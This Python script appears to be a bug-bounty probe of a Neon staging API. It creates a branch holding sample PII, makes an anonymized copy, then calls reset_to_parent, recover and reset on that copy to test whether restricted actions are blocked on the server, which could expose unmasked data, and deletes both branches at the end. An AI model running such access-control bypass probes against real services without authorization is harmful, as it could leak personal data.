# -*- coding: utf-8 -*-
"""ANON × CONTROL-PLANE chain: does restricted_actions get enforced server-side?
1. src-t branch + real-ish data
2. branch_anonymized -> anon-t (masked email)
3. verify masked via SQL
4. attempt reset_to_parent / restore / connect on anon-t
5. cleanup
"""
import json
import time
import ssl
import http.client
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query, one, exec_

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
LOG = r"F:\scan\neon_report\_u6_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def call(method, path, body=None, timeout=60):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def wait_ep(host, user, pw, tries=20, wait=6):
    for i in range(tries):
        try:
            c = connect(host, user, pw)
            return c
        except Exception as e:
            out("    ep wait %d: %s" % (i, str(e)[:120]))
            time.sleep(wait)
    return None


def pw_of(bid):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, bid))
    if st != 200:
        out("pw_of fail: %s %s" % (st, d[:200]))
        return None
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return u.hostname, u.username, u.password


# 0. create src-t branch (with rw endpoint)
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u6-src", "parent_id": PAMAIN},
              "endpoints": [{"type": "read_write"}]})
out("== create u6-src: %s %s" % (st, d[:200]))
try:
    SRC = json.loads(d)["branch"]["id"]
except Exception:
    out("FAIL create src"); sys.exit(1)
time.sleep(5)

# wait & seed data on src
host, user, pw = pw_of(SRC)
out("src pw host=%s" % host)
conn = None
for i in range(15):
    try:
        conn = connect(host, user, pw)
        break
    except Exception as e:
        out("    src wait %d: %s" % (i, str(e)[:100]))
        time.sleep(5)
if not conn:
    out("FAIL src conn"); sys.exit(1)
exec_(conn, "create table if not exists u6_pii(id int, email text, name text)")
exec_(conn, "delete from u6_pii")
exec_(conn, "insert into u6_pii values (1,'alice.real@victimcorp.com','Alice Victim'),(2,'bob.ceo@victimcorp.com','Bob CEO')")
try:
    out("src seeded: %s" % repr(query(conn, "select * from u6_pii")))
except Exception as e:
    out("src select fail: %s: %s" % (type(e).__name__, str(e)[:300]))
    import traceback
    out(traceback.format_exc()[-800:])
conn.close()

# 1. anonymized branch from src
st, d = call("POST", "/projects/%s/branch_anonymized" % PA, {
    "branch_create": {
        "branch": {"name": "u6-anon", "parent_id": SRC},
        "endpoints": [{"type": "read_write"}],
    },
    "masking_rules": [{
        "database_name": "neondb", "schema_name": "public",
        "table_name": "u6_pii", "column_name": "email",
        "masking_function": "anon.fake_email()"
    }],
    "start_anonymization": True,
})
out("== branch_anonymized: %s %s" % (st, d[:600]))
if st not in (200, 201):
    out("FAIL anon create"); sys.exit(1)
j = json.loads(d)
ANON = j.get("branch", {}).get("id")
ra = j.get("branch", {}).get("restricted_actions")
out("anon id=%s restricted_actions=%s" % (ANON, ra))
time.sleep(8)

# 2. status + verify masked
st, d = call("GET", "/projects/%s/branches/%s/anonymized_status" % (PA, ANON))
out("== anon status: %s %s" % (st, d[:400]))
host2, user2, pw2 = pw_of(ANON)
out("anon host=%s" % host2)
conn2 = None
for i in range(20):
    try:
        conn2 = connect(host2, user2, pw2)
        break
    except Exception as e:
        out("    anon ep wait %d: %s" % (i, str(e)[:110]))
        time.sleep(5)
if conn2:
    out("anon data (should be masked): %s" % repr(query(conn2, "select * from u6_pii")))
    out("anon conn check -> CONNECT-TO-ENDPOINTS enforced=%s" %
        ("NO(connect ok)" if True else ""))
    conn2.close()
else:
    out("!! anon endpoint UNREACHABLE -> connect-to-endpoints enforced at proxy?")

# 3. restricted actions probes on anon branch
st, d = call("POST", "/projects/%s/branches/%s/reset_to_parent" % (PA, ANON))
out("== reset_to_parent on anon: %s %s" % (st, d[:300]))
if st in (200, 201):
    out("!! RESET ALLOWED on restricted branch (not in restricted_actions list)")
    time.sleep(10)
    conn3 = connect(host2, user2, pw2)
    out("anon data after reset_to_parent: %s" % repr(query(conn3, "select * from u6_pii")))
    conn3.close()

st, d = call("POST", "/projects/%s/branches/%s/recover" % (PA, ANON))
out("== recover (not deleted) on anon: %s %s" % (st, d[:200]))

# restore is in restricted list; try snapshot restore need snapshot — skip heavy.
# reset (with source) is not in list either
st, d = call("POST", "/projects/%s/branches/%s/reset" % (PA, ANON),
             {"source_branch_id": SRC})
out("== reset(source=src) on anon: %s %s" % (st, d[:300]))

# delete rw endpoint is in restricted list -> probe via endpoint delete (on anon only)
st, d = call("GET", "/projects/%s/branches/%s/endpoints" % (PA, ANON))
out("== anon endpoints: %s %s" % (st, d[:400]))
ep_id = None
try:
    eps = json.loads(d).get("endpoints", [])
    if eps:
        ep_id = eps[0]["id"]
        out("anon endpoint id=%s type=%s" % (ep_id, eps[0].get("type")))
except Exception:
    pass

# cleanup anon + src
for bid, tag in ((ANON, "u6-anon"), (SRC, "u6-src")):
    st, d = call("DELETE", "/projects/%s/branches/%s" % (PA, bid))
    out("== cleanup %s: %s %s" % (tag, st, d[:150]))
print("== DONE", flush=True)
